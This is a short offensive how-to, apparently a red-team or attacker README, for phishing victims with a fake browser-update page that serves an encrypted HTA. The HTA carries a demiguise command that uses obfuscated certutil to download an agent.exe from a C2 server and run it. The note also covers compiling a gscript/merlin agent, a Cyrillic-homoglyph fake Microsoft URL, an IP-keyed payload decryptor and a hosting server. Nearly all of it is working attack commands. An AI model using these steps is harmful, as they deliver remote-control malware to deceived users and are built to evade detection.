Phishing HTA Shell
====

Phish victims by directing them to a malicious browser update page. HTA or download fallback. Use demiguise to generate encrypted hta pages. Obfuscate the agent with Invoke Obfuscater (PS), DKMC or gscript. Here I'm using gscript/merlin C2C. Obfuscate your DOS commands with "" ^ / etc.

## Environment
Target IP: ```99.59.119.28```
C2C Server: ```26.00.13.37```

## Gscript
```./gscript compile --os=windows --arch=amd64 merlin.gs```
optionally generate payloads for other operating systems

## Demiguise
```python demiguise.py -k 99.59.119.28 -c 'cmd.exe /c certutil /""ur""lcache -split -f ht^tp://26.00.13.37/agent.exe %userprofile%\\AppData\\Local\\Temp\\agent.exe && cmd.exe /c %userprofile%\\AppData\\Local\\Temp\\agent.exe' -o /root/phishing/hta/index.hta -p WbemScripting.SWbemLocator```

or: ```-f ht^tp://micrоsoft.com/en-us/updates/update.exe```  (crylic о character)

## Payload Decryptor
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
var dFcdrH=function () 
	{var ithurswhenip=$.ajax({url:'https://api.ipify.org?format=json',async:false}).responseJSON.ip;return ithurswhenip};

## Start server

```screen -d -m "python3 -m http.server 80"```
